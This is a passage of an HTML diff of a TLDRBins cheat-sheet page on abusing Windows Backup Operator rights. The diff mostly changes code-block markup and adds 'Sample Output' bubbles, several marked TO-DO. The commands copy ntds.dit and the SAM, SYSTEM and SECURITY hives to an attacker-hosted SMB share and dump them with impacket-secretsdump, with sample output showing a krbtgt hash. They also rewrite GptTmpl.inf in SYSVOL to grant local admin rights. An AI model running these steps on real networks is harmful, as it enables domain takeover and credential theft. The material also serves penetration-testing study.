-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\10.10.14.31\share\ntds.dit
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">reg.exe save hklm\system \\&lt;LOCAL_IP&gt;\share\system
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; reg.exe save hklm\system \\10.10.14.31\share\system
-</span></span></span></code></pre></div><h4 id="5-secrets-dump">5. Secrets Dump</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump -ntds ntds.dit -system system LOCAL
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-secretsdump -ntds ntds.dit -system system LOCAL
+</span></span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\<span class="o">&lt;LOCAL_IP&gt;</span>\share\ntds.dit
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\10.10.14.31\share\ntds.dit
+</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">reg.exe save hklm\system \\<span class="o">&lt;LOCAL_IP&gt;</span>\share\system
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; reg.exe save hklm\system \\10.10.14.31\share\system
+</span></span></span></div></pre></div><h4 id="5-secrets-dump">5. Secrets Dump</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump -ntds ntds.dit -system system LOCAL
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> impacket-secretsdump -ntds ntds.dit -system system LOCAL
 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
@@ -422,50 +406,59 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
 </span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up...
-</span></span></span></code></pre></div><hr>
+</span></span></span></div></pre></div><hr>
 <h3 id="abuse-4-backupoperatortoda">Abuse #4: BackupOperatorToDA</h3>
 <h4 id="1-host-a-smb-server-in-linux">1. Host a SMB Server (In Linux)</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-smbserver share . -smb2support
-</span></span></span></code></pre></div><h4 id="2-copy-hives">2. Copy Hives</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\BackupOperatorToDA.exe -t \\&lt;TARGET_COMPUTER&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -d &lt;DOMAIN&gt; -o \\&lt;LOCAL_IP&gt;\share\
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\BackupOperatorToDA.exe -t \\DC01 -u user -p &#39;password&#39; -d example.com -o \\10.10.14.2\share\
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-smbserver share . -smb2support
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="2-copy-hives">2. Copy Hives</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\BackupOperatorToDA.exe -t \\<span class="o">&lt;TARGET_COMPUTER&gt;</span> -u '<span class="o">&lt;USER&gt;</span>' -p '<span class="o">&lt;PASSWORD&gt;</span>' -d <span class="o">&lt;DOMAIN&gt;</span> -o \\<span class="o">&lt;LOCAL_IP&gt;</span>\share\
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\BackupOperatorToDA.exe -t \\DC01 -u user -p 'password' -d example.com -o \\10.10.14.2\share\
 </span></span></span><span class="line"><span class="cl"><span class="go">Making user token
 </span></span></span><span class="line"><span class="cl"><span class="go">Dumping SAM hive to \\10.10.14.2\share\SAM
 </span></span></span><span class="line"><span class="cl"><span class="go">Dumping SYSTEM hive to \\10.10.14.2\share\SYSTEM
 </span></span></span><span class="line"><span class="cl"><span class="go">Dumping SECURITY hive to \\10.10.14.2\share\SECURITY
-</span></span></span></code></pre></div><h4 id="3-secrets-dump">3. Secrets Dump</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
-</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/mpgn/BackupOperatorToDA">BackupOperatorToDA.exe</a></em></small></p>
+</span></span></span></div></pre></div><h4 id="3-secrets-dump">3. Secrets Dump</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><p><small><em>Ref: <a href="https://github.com/mpgn/BackupOperatorToDA">BackupOperatorToDA.exe</a></em></small></p>
 <hr>
 <h3 id="abuse-5-modify-gpttmplinf">Abuse #5: Modify GptTmpl.inf</h3>
 <h4 id="1-copy-gpttmplinf">1. Copy GptTmpl.inf</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">robocopy /b &#34;\\&lt;DOMAIN&gt;\sysvol\&lt;DOMAIN&gt;\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit&#34; &#34;C:\ProgramData&#34; GptTmpl.inf
-</span></span></span></code></pre></div><h4 id="2-check-target-user-sid">2. Check Target User SID</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainUser | Select-Object samaccountname, objectsid
-</span></span></span></code></pre></div><h4 id="3-add-target-user-to-local-admin-group">3. Add Target User to Local Admin Group</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Append to GptTmpl.inf
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">robocopy /b "\\<span class="o">&lt;DOMAIN&gt;</span>\sysvol\<span class="o">&lt;DOMAIN&gt;</span>\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit" "C:\ProgramData" GptTmpl.inf
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="2-check-target-user-sid">2. Check Target User SID</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainUser | Select-Object samaccountname, objectsid
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="3-add-target-user-to-local-admin-group">3. Add Target User to Local Admin Group</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Append to GptTmpl.inf
 </span></span><span class="line"><span class="cl"><span class="go">[Group Membership]
-</span></span></span><span class="line"><span class="cl"><span class="go">*&lt;SID&gt;__Memberof = *S-1-5-32-544
-</span></span></span><span class="line"><span class="cl"><span class="go">*&lt;SID&gt;__Members =
+</span></span></span><span class="line"><span class="cl"><span class="go">*<span class="o">&lt;SID&gt;</span>__Memberof = *S-1-5-32-544
+</span></span></span><span class="line"><span class="cl"><span class="go">*<span class="o">&lt;SID&gt;</span>__Members =
 </span></span></span><span class="line"><span class="cl"><span class="go">*S-1-5-32-544__Memberof =
-</span></span></span><span class="line"><span class="cl"><span class="go">*S-1-5-32-544__Members = *&lt;SID&gt;
-</span></span></span></code></pre></div><h4 id="4-overwrite-original-gpttmplinf">4. Overwrite Original GptTmpl.inf</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">robocopy /b &#34;C:\Programdata&#34; &#34;\\&lt;DOMAIN&gt;\sysvol\&lt;DOMAIN&gt;\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit&#34; GptTmpl.inf
-</span></span></span></code></pre></div><h4 id="5-wait">5. Wait</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Wait or force gpupdate <span class="o">(</span><span class="k">if</span> possible<span class="o">)</span>
+</span></span></span><span class="line"><span class="cl"><span class="go">*S-1-5-32-544__Members = *<span class="o">&lt;SID&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="4-overwrite-original-gpttmplinf">4. Overwrite Original GptTmpl.inf</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">robocopy /b "C:\Programdata" "\\<span class="o">&lt;DOMAIN&gt;</span>\sysvol\<span class="o">&lt;DOMAIN&gt;</span>\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit" GptTmpl.inf
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="5-wait">5. Wait</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Wait or force gpupdate <span class="o">(</span><span class="k">if</span> possible<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="go">gpupdate /force
-</span></span></span></code></pre></div><h4 id="6-secrets-dump">6. Secrets Dump</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;TARGET_DOMAIN&gt;&#39; -dc-ip &lt;DC_IP&gt;
-</span></span></span></code></pre></div>
-</div></div>
-    
-    <script type="module" src="/js/main.js"></script>
-    <footer>
-    <hr>
-    <div class="footer-text">
-        <div>© 2025 TLDRBins</div>
-    </div>
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="6-secrets-dump">6. Secrets Dump</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump '<span class="o">&lt;DOMAIN&gt;</span>/<span class="o">&lt;USER&gt;</span>:<span class="o">&lt;PASSWORD&gt;</span>@<span class="o">&lt;TARGET_DOMAIN&gt;</span>' -dc-ip <span class="o">&lt;DC_IP&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div>
+</div>
+</main>
+<script type="module" src="/js/main.js"></script>
+<footer>
+  <hr>
+  <div>© 2025 TLDRBins</div>
 </footer>
-</body>
-</html>
+
+
+</body></html>
